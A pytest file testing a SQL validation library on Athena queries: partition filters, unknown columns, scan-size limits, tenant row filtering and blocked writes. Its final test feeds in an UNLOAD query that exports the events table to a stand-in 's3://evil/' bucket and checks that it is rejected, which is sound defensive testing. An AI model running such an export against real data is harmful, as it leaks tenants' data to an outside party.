"""Athena/Trino dialect: partitions, struct access, columnar cost, RLS."""

from __future__ import annotations

import pytest

from sqlguard import Catalog, Code, Policy, RLSRule, SQLGuard


@pytest.fixture
def athena_guard(athena_catalog: Catalog) -> SQLGuard:
    policy = Policy(
        rls=[RLSRule(table="events", column="tenant_id", param="tenant")],
        max_bytes_scanned=100 * (1 << 30),
        partition_selectivity=0.02,
        on_missing_stats="ignore",
    )
    return SQLGuard(athena_catalog, policy, dialect="athena")


def test_partition_filter_required(athena_guard):
    result = athena_guard.validate(
        "SELECT event_id FROM analytics.events", params={"tenant": 1}
    )
    assert not result.valid
    assert any(v.code == Code.MISSING_PARTITION_FILTER for v in result.errors)


def test_partitioned_query_passes(athena_guard):
    result = athena_guard.validate(
        "SELECT event_id, event_type FROM analytics.events WHERE dt = '2026-07-01'",
        params={"tenant": 1},
    )
    assert result.valid, [str(v) for v in result.errors]
    assert "tenant_id = 1" in result.sql


def test_struct_field_access_no_false_positive(athena_guard):
    """`payload.referrer` is struct-member access, not an unknown table."""
    result = athena_guard.validate(
        "SELECT payload.referrer FROM analytics.events WHERE dt = '2026-07-01'",
        params={"tenant": 1},
    )
    assert result.valid, [str(v) for v in result.errors]


def test_hallucinated_column_still_caught_on_athena(athena_guard):
    result = athena_guard.validate(
        "SELECT nonexistent FROM analytics.events WHERE dt = '2026-07-01'",
        params={"tenant": 1},
    )
    assert not result.valid
    assert any(v.code == Code.UNKNOWN_COLUMN for v in result.errors)


def test_big_scan_blocked_even_with_partition(athena_catalog):
    """A partition filter still leaves too much: 4 TiB * 2% > 50 GiB cap."""
    guard = SQLGuard(
        athena_catalog,
        Policy(
            max_bytes_scanned=50 * (1 << 30),
            partition_selectivity=0.5,  # weak pruning
            on_missing_stats="ignore",
        ),
        dialect="athena",
    )
    result = guard.validate(
        "SELECT event_id, user_id, tenant_id, event_type, payload, dt "
        "FROM analytics.events WHERE dt = '2026-07-01'"
    )
    assert not result.valid
    assert any(v.code == Code.SCAN_BUDGET_EXCEEDED for v in result.errors)


def test_join_across_partitioned_and_dim(athena_guard):
    sql = """
        SELECT e.event_id, u.name
        FROM analytics.events e
        JOIN analytics.dim_user u ON e.user_id = u.user_id
        WHERE e.dt = '2026-07-01'
    """
    result = athena_guard.validate(sql, params={"tenant": 1})
    assert result.valid, [str(v) for v in result.errors]
    assert "e.tenant_id = 1" in result.sql


def test_athena_write_blocked(athena_guard):
    result = athena_guard.validate(
        "INSERT INTO analytics.events VALUES (1)", params={"tenant": 1}
    )
    assert not result.valid


def test_athena_ctas_blocked(athena_guard):
    result = athena_guard.validate(
        "CREATE TABLE x AS SELECT * FROM analytics.events", params={"tenant": 1}
    )
    assert not result.valid


def test_athena_unload_blocked(athena_guard):
    result = athena_guard.validate(
        "UNLOAD (SELECT * FROM analytics.events) TO 's3://evil/' WITH (format='PARQUET')",
        params={"tenant": 1},
    )
    assert not result.valid
